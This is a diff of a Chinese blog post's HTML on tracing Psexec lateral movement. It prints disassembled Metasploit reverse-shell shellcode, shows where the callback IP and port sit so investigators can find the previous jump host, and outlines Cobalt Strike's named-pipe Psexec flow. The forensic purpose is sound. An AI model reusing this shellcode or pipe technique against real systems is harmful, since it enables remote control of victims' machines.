+<span id="cb6-88"><a href="#cb6-88" aria-hidden="true" tabindex="-1"></a>0x00000000000000c2:  50                   <span class="bu">push</span>   <span class="kw">eax</span></span>
+<span id="cb6-89"><a href="#cb6-89" aria-hidden="true" tabindex="-1"></a>0x00000000000000c3:  68 EA <span class="fl">0</span><span class="bn">F</span> <span class="dt">DF</span> E0       push   <span class="bn">0xe0df0fea</span></span>
+<span id="cb6-90"><a href="#cb6-90" aria-hidden="true" tabindex="-1"></a>0x00000000000000c8:  FF D5                call   <span class="kw">ebp</span></span>
+<span id="cb6-91"><a href="#cb6-91" aria-hidden="true" tabindex="-1"></a>0x00000000000000ca:  97                   <span class="bu">xchg</span>   <span class="kw">eax</span><span class="op">,</span> <span class="kw">edi</span></span>
+<span id="cb6-92"><a href="#cb6-92" aria-hidden="true" tabindex="-1"></a>0x00000000000000cb:  6A 10                <span class="bu">push</span>   <span class="bn">0x10</span></span>
+<span id="cb6-93"><a href="#cb6-93" aria-hidden="true" tabindex="-1"></a>0x00000000000000cd:  56                   <span class="bu">push</span>   <span class="kw">esi</span></span>
+<span id="cb6-94"><a href="#cb6-94" aria-hidden="true" tabindex="-1"></a>0x00000000000000ce:  57                   <span class="bu">push</span>   <span class="kw">edi</span></span>
+<span id="cb6-95"><a href="#cb6-95" aria-hidden="true" tabindex="-1"></a>0x00000000000000cf:  68 99 A5 <span class="dv">74</span> <span class="dv">61</span>       push   <span class="bn">0x6174a599</span></span>
+<span id="cb6-96"><a href="#cb6-96" aria-hidden="true" tabindex="-1"></a>0x00000000000000d4:  FF D5                call   <span class="kw">ebp</span></span>
+<span id="cb6-97"><a href="#cb6-97" aria-hidden="true" tabindex="-1"></a>0x00000000000000d6:  85 C0                test   <span class="kw">eax</span><span class="op">,</span> <span class="kw">eax</span></span>
+<span id="cb6-98"><a href="#cb6-98" aria-hidden="true" tabindex="-1"></a>0x00000000000000d8:  74 0A                <span class="cf">je</span>     <span class="bn">0xe4</span></span>
+<span id="cb6-99"><a href="#cb6-99" aria-hidden="true" tabindex="-1"></a>0x00000000000000da:  FF <span class="dv">4</span><span class="er">E</span> <span class="dv">08</span>             dec    <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">esi</span> <span class="op">+</span> <span class="dv">8</span><span class="op">]</span></span>
+<span id="cb6-100"><a href="#cb6-100" aria-hidden="true" tabindex="-1"></a>0x00000000000000dd:  75 EC                jne    <span class="bn">0xcb</span></span>
+<span id="cb6-101"><a href="#cb6-101" aria-hidden="true" tabindex="-1"></a>0x00000000000000df:  E8 <span class="dv">67</span> <span class="dv">00</span> <span class="dv">00</span> <span class="dv">00</span>       call   <span class="bn">0x14b</span></span>
+<span id="cb6-102"><a href="#cb6-102" aria-hidden="true" tabindex="-1"></a>0x00000000000000e4:  6A 00                <span class="bu">push</span>   <span class="dv">0</span></span>
+<span id="cb6-103"><a href="#cb6-103" aria-hidden="true" tabindex="-1"></a>0x00000000000000e6:  6A 04                <span class="bu">push</span>   <span class="dv">4</span></span>
+<span id="cb6-104"><a href="#cb6-104" aria-hidden="true" tabindex="-1"></a>0x00000000000000e8:  56                   <span class="bu">push</span>   <span class="kw">esi</span></span>
+<span id="cb6-105"><a href="#cb6-105" aria-hidden="true" tabindex="-1"></a>0x00000000000000e9:  57                   <span class="bu">push</span>   <span class="kw">edi</span></span>
+<span id="cb6-106"><a href="#cb6-106" aria-hidden="true" tabindex="-1"></a>0x00000000000000ea:  68 02 D9 C8 <span class="fl">5</span><span class="bn">F</span>       push   <span class="bn">0x5fc8d902</span></span>
+<span id="cb6-107"><a href="#cb6-107" aria-hidden="true" tabindex="-1"></a>0x00000000000000ef:  FF D5                call   <span class="kw">ebp</span></span>
+<span id="cb6-108"><a href="#cb6-108" aria-hidden="true" tabindex="-1"></a>0x00000000000000f1:  83 F8 <span class="dv">00</span>             cmp    <span class="kw">eax</span><span class="op">,</span> <span class="dv">0</span></span>
+<span id="cb6-109"><a href="#cb6-109" aria-hidden="true" tabindex="-1"></a>0x00000000000000f4:  7E 36                <span class="cf">jle</span>    <span class="bn">0x12c</span></span>
+<span id="cb6-110"><a href="#cb6-110" aria-hidden="true" tabindex="-1"></a>0x00000000000000f6:  8B 36                <span class="bu">mov</span>    <span class="kw">esi</span><span class="op">,</span> <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">esi</span><span class="op">]</span></span>
+<span id="cb6-111"><a href="#cb6-111" aria-hidden="true" tabindex="-1"></a>0x00000000000000f8:  6A 40                <span class="bu">push</span>   <span class="bn">0x40</span></span>
+<span id="cb6-112"><a href="#cb6-112" aria-hidden="true" tabindex="-1"></a>0x00000000000000fa:  68 00 10 00 00       <span class="bu">push</span>   <span class="bn">0x1000</span></span>
+<span id="cb6-113"><a href="#cb6-113" aria-hidden="true" tabindex="-1"></a>0x00000000000000ff:  56                   <span class="bu">push</span>   <span class="kw">esi</span></span>
+<span id="cb6-114"><a href="#cb6-114" aria-hidden="true" tabindex="-1"></a>0x0000000000000100:  6A 00                <span class="bu">push</span>   <span class="dv">0</span></span>
+<span id="cb6-115"><a href="#cb6-115" aria-hidden="true" tabindex="-1"></a>0x0000000000000102:  68 58 A4 <span class="dv">53</span> E5       push   <span class="bn">0xe553a458</span></span>
+<span id="cb6-116"><a href="#cb6-116" aria-hidden="true" tabindex="-1"></a>0x0000000000000107:  FF D5                call   <span class="kw">ebp</span></span>
+<span id="cb6-117"><a href="#cb6-117" aria-hidden="true" tabindex="-1"></a>0x0000000000000109:  93                   <span class="bu">xchg</span>   <span class="kw">eax</span><span class="op">,</span> <span class="kw">ebx</span></span>
+<span id="cb6-118"><a href="#cb6-118" aria-hidden="true" tabindex="-1"></a>0x000000000000010a:  53                   <span class="bu">push</span>   <span class="kw">ebx</span></span>
+<span id="cb6-119"><a href="#cb6-119" aria-hidden="true" tabindex="-1"></a>0x000000000000010b:  6A 00                <span class="bu">push</span>   <span class="dv">0</span></span>
+<span id="cb6-120"><a href="#cb6-120" aria-hidden="true" tabindex="-1"></a>0x000000000000010d:  56                   <span class="bu">push</span>   <span class="kw">esi</span></span>
+<span id="cb6-121"><a href="#cb6-121" aria-hidden="true" tabindex="-1"></a>0x000000000000010e:  53                   <span class="bu">push</span>   <span class="kw">ebx</span></span>
+<span id="cb6-122"><a href="#cb6-122" aria-hidden="true" tabindex="-1"></a>0x000000000000010f:  57                   <span class="bu">push</span>   <span class="kw">edi</span></span>
+<span id="cb6-123"><a href="#cb6-123" aria-hidden="true" tabindex="-1"></a>0x0000000000000110:  68 02 D9 C8 <span class="fl">5</span><span class="bn">F</span>       push   <span class="bn">0x5fc8d902</span></span>
+<span id="cb6-124"><a href="#cb6-124" aria-hidden="true" tabindex="-1"></a>0x0000000000000115:  FF D5                call   <span class="kw">ebp</span></span>
+<span id="cb6-125"><a href="#cb6-125" aria-hidden="true" tabindex="-1"></a>0x0000000000000117:  83 F8 <span class="dv">00</span>             cmp    <span class="kw">eax</span><span class="op">,</span> <span class="dv">0</span></span>
+<span id="cb6-126"><a href="#cb6-126" aria-hidden="true" tabindex="-1"></a>0x000000000000011a:  7D 28                <span class="cf">jge</span>    <span class="bn">0x144</span></span>
+<span id="cb6-127"><a href="#cb6-127" aria-hidden="true" tabindex="-1"></a>0x000000000000011c:  58                   <span class="bu">pop</span>    <span class="kw">eax</span></span>
+<span id="cb6-128"><a href="#cb6-128" aria-hidden="true" tabindex="-1"></a>0x000000000000011d:  68 00 40 00 00       <span class="bu">push</span>   <span class="bn">0x4000</span></span>
+<span id="cb6-129"><a href="#cb6-129" aria-hidden="true" tabindex="-1"></a>0x0000000000000122:  6A 00                <span class="bu">push</span>   <span class="dv">0</span></span>
+<span id="cb6-130"><a href="#cb6-130" aria-hidden="true" tabindex="-1"></a>0x0000000000000124:  50                   <span class="bu">push</span>   <span class="kw">eax</span></span>
+<span id="cb6-131"><a href="#cb6-131" aria-hidden="true" tabindex="-1"></a>0x0000000000000125:  68 0B 2F 0F 30       <span class="bu">push</span>   <span class="bn">0x300f2f0b</span></span>
+<span id="cb6-132"><a href="#cb6-132" aria-hidden="true" tabindex="-1"></a>0x000000000000012a:  FF D5                call   <span class="kw">ebp</span></span>
+<span id="cb6-133"><a href="#cb6-133" aria-hidden="true" tabindex="-1"></a>0x000000000000012c:  57                   <span class="bu">push</span>   <span class="kw">edi</span></span>
+<span id="cb6-134"><a href="#cb6-134" aria-hidden="true" tabindex="-1"></a>0x000000000000012d:  68 75 6E 4D 61       <span class="bu">push</span>   <span class="bn">0x614d6e75</span></span>
+<span id="cb6-135"><a href="#cb6-135" aria-hidden="true" tabindex="-1"></a>0x0000000000000132:  FF D5                call   <span class="kw">ebp</span></span>
+<span id="cb6-136"><a href="#cb6-136" aria-hidden="true" tabindex="-1"></a>0x0000000000000134:  5E                   <span class="bu">pop</span>    <span class="kw">esi</span></span>
+<span id="cb6-137"><a href="#cb6-137" aria-hidden="true" tabindex="-1"></a>0x0000000000000135:  5E                   <span class="bu">pop</span>    <span class="kw">esi</span></span>
+<span id="cb6-138"><a href="#cb6-138" aria-hidden="true" tabindex="-1"></a>0x0000000000000136:  FF <span class="dv">0</span><span class="er">C</span> <span class="dv">24</span>             dec    <span class="dt">dword</span> <span class="dt">ptr</span> <span class="op">[</span><span class="kw">esp</span><span class="op">]</span></span>
+<span id="cb6-139"><a href="#cb6-139" aria-hidden="true" tabindex="-1"></a>0x0000000000000139:  0F 85 70 FF FF FF    jne    <span class="bn">0xaf</span></span>
+<span id="cb6-140"><a href="#cb6-140" aria-hidden="true" tabindex="-1"></a>0x000000000000013f:  E9 <span class="dv">9</span><span class="er">B</span> FF FF FF       jmp    <span class="bn">0xdf</span></span>
+<span id="cb6-141"><a href="#cb6-141" aria-hidden="true" tabindex="-1"></a>0x0000000000000144:  01 C3                add    <span class="kw">ebx</span><span class="op">,</span> <span class="kw">eax</span></span>
+<span id="cb6-142"><a href="#cb6-142" aria-hidden="true" tabindex="-1"></a>0x0000000000000146:  29 C6                sub    <span class="kw">esi</span><span class="op">,</span> <span class="kw">eax</span></span>
+<span id="cb6-143"><a href="#cb6-143" aria-hidden="true" tabindex="-1"></a>0x0000000000000148:  75 C1                jne    <span class="bn">0x10b</span></span>
+<span id="cb6-144"><a href="#cb6-144" aria-hidden="true" tabindex="-1"></a>0x000000000000014a:  C3                   ret    </span>
+<span id="cb6-145"><a href="#cb6-145" aria-hidden="true" tabindex="-1"></a>0x000000000000014b:  BB E0 <span class="dv">1</span><span class="bn">D</span> <span class="dv">2</span><span class="er">A</span> <span class="dv">0</span><span class="er">A</span>       mov    <span class="kw">ebx</span><span class="op">,</span> <span class="bn">0xa2a1de0</span></span>
+<span id="cb6-146"><a href="#cb6-146" aria-hidden="true" tabindex="-1"></a>0x0000000000000150:  68 A6 <span class="dv">95</span> BD <span class="dv">9</span><span class="bn">D</span>       push   <span class="bn">0x9dbd95a6</span></span>
+<span id="cb6-147"><a href="#cb6-147" aria-hidden="true" tabindex="-1"></a>0x0000000000000155:  FF D5                call   <span class="kw">ebp</span></span>
+<span id="cb6-148"><a href="#cb6-148" aria-hidden="true" tabindex="-1"></a>0x0000000000000157:  3C 06                <span class="bu">cmp</span>    <span class="kw">al</span><span class="op">,</span> <span class="dv">6</span></span>
+<span id="cb6-149"><a href="#cb6-149" aria-hidden="true" tabindex="-1"></a>0x0000000000000159:  7C 0A                <span class="cf">jl</span>     <span class="bn">0x165</span></span>
+<span id="cb6-150"><a href="#cb6-150" aria-hidden="true" tabindex="-1"></a>0x000000000000015b:  80 FB E0             cmp    <span class="kw">bl</span><span class="op">,</span> <span class="bn">0xe0</span></span>
+<span id="cb6-151"><a href="#cb6-151" aria-hidden="true" tabindex="-1"></a>0x000000000000015e:  75 05                <span class="cf">jne</span>    <span class="bn">0x165</span></span>
+<span id="cb6-152"><a href="#cb6-152" aria-hidden="true" tabindex="-1"></a>0x0000000000000160:  BB <span class="dv">47</span> <span class="dv">13</span> <span class="dv">72</span> <span class="fl">6</span><span class="bn">F</span>       mov    <span class="kw">ebx</span><span class="op">,</span> <span class="bn">0x6f721347</span></span>
+<span id="cb6-153"><a href="#cb6-153" aria-hidden="true" tabindex="-1"></a>0x0000000000000165:  6A 00                <span class="bu">push</span>   <span class="dv">0</span></span>
+<span id="cb6-154"><a href="#cb6-154" aria-hidden="true" tabindex="-1"></a>0x0000000000000167:  53                   <span class="bu">push</span>   <span class="kw">ebx</span></span>
+<span id="cb6-155"><a href="#cb6-155" aria-hidden="true" tabindex="-1"></a>0x0000000000000168:  FF D5                call   <span class="kw">ebp</span></span></code></pre></div>
 <p>显然，这是msf的生成的默认shellcode，其中在偏移<code>0x000af</code>和<code>0x000b4</code>处，分别为反弹的十六进制IP地址以及端口</p>
-<pre><code class="lang-asm">0x00000000000000ad:  6A 0A                push   0xa
-0x00000000000000af:  68 C0 A8 34 8F       push   0x8f34a8c0
-0x00000000000000b4:  68 02 00 11 46       push   0x601e0002
-0x00000000000000b9:  89 E6                mov    esi, esp
-0x00000000000000bb:  50                   push   eax
-0x00000000000000bc:  50                   push   eax
-0x00000000000000bd:  50                   push   eax
-0x00000000000000be:  50                   push   eax
-0x00000000000000bf:  40                   inc    eax
-0x00000000000000c0:  50                   push   eax
-0x00000000000000c1:  40                   inc    eax
-0x00000000000000c2:  50                   push   eax
-0x00000000000000c3:  68 EA 0F DF E0       push   0xe0df0fea
-0x00000000000000c8:  FF D5                call   ebp
-</code></pre>
+<div class="sourceCode" id="cb7"><pre class="sourceCode asm"><code class="sourceCode fasm"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>0x00000000000000ad:  6A 0A                <span class="bu">push</span>   <span class="bn">0xa</span></span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a>0x00000000000000af:  68 C0 A8 <span class="dv">34</span> <span class="fl">8</span><span class="bn">F</span>       push   <span class="bn">0x8f34a8c0</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>0x00000000000000b4:  68 02 00 11 46       <span class="bu">push</span>   <span class="bn">0x601e0002</span></span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>0x00000000000000b9:  89 E6                mov    <span class="kw">esi</span><span class="op">,</span> <span class="kw">esp</span></span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>0x00000000000000bb:  50                   <span class="bu">push</span>   <span class="kw">eax</span></span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>0x00000000000000bc:  50                   <span class="bu">push</span>   <span class="kw">eax</span></span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>0x00000000000000bd:  50                   <span class="bu">push</span>   <span class="kw">eax</span></span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>0x00000000000000be:  50                   <span class="bu">push</span>   <span class="kw">eax</span></span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>0x00000000000000bf:  40                   <span class="bu">inc</span>    <span class="kw">eax</span></span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>0x00000000000000c0:  50                   <span class="bu">push</span>   <span class="kw">eax</span></span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>0x00000000000000c1:  40                   <span class="bu">inc</span>    <span class="kw">eax</span></span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>0x00000000000000c2:  50                   <span class="bu">push</span>   <span class="kw">eax</span></span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>0x00000000000000c3:  68 EA <span class="fl">0</span><span class="bn">F</span> <span class="dt">DF</span> E0       push   <span class="bn">0xe0df0fea</span></span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>0x00000000000000c8:  FF D5                call   <span class="kw">ebp</span></span></code></pre></div>
 <p>偷懒直接在线转了 <a href="http://redmark.site/tools/ip_converter.htm" target="_blank" rel="noopener">IP地址转换</a></p>
-<p><img src="/2020/03/01/Psexec溯源/image-20200325170635618.png" alt="image-20200325170635618"></p>
-<p><img src="/2020/03/01/Psexec溯源/image-20200325170854141.png" alt="image-20200325170854141"></p>
+<figure>
+<img src="/2020/03/01/Psexec溯源/image-20200325170635618.png" alt="image-20200325170635618">
+<figcaption aria-hidden="true">image-20200325170635618</figcaption>
+</figure>
+<figure>
+<img src="/2020/03/01/Psexec溯源/image-20200325170854141.png" alt="image-20200325170854141">
+<figcaption aria-hidden="true">image-20200325170854141</figcaption>
+</figure>
 <p>唯一要注意的是参数是小端存储的</p>
 <p>于是我们在溯源时可以按步骤提取，寻找上一个跳板机，说不定会有更大的收获呢。</p>
-<h2 id="4-补充"><a href="#4-补充" class="headerlink" title="4. 补充"></a>4. 补充</h2><h3 id="4-1-CS的Psexec-bind-smb-listener"><a href="#4-1-CS的Psexec-bind-smb-listener" class="headerlink" title="4.1 CS的Psexec(bind_smb_listener)"></a>4.1 CS的Psexec(bind_smb_listener)</h3><p>另外，CS中的<code>Psexec</code>和<code>Psexec(psh)</code>的执行原理基本同上（使用的是<code>bind_smb_listener</code>，如果使用其他<code>listener</code>则数据通道部分会不同）</p>
-<ol>
+<h2 id="补充">4. 补充</h2>
+<h3 id="cs的psexecbind_smb_listener">4.1
+CS的Psexec(bind_smb_listener)</h3>
+<p>另外，CS中的<code>Psexec</code>和<code>Psexec(psh)</code>的执行原理基本同上（使用的是<code>bind_smb_listener</code>，如果使用其他<code>listener</code>则数据通道部分会不同）</p>
+<ol type="1">
 <li>远程创建服务（随机服务名）；</li>
 <li>启动服务调用<code>%ComSpec%</code>(cmd.exe)，运行powershell脚本，脚本会本地创建用于传输Stager的通道<code>staus_xxx</code>以及后续数据传输管道<code>msagent_xxx</code>；</li>
 <li>远程连接管道<code>staus_xxx</code>，传输Stager;</li>
@@ -532,5 +555,20 @@ $blUE9 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer
 <script>hljs.highlightAll();</script>
 
     </div>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
+            processEscapes: true
+        }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax();
+        for (var i = 0; i < all.length; ++i)
+            all[i].SourceElement().parentNode.className += ' has-jax';
+    });
+</script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-MML-AM_CHTML"></script>
 </body>
 </html>
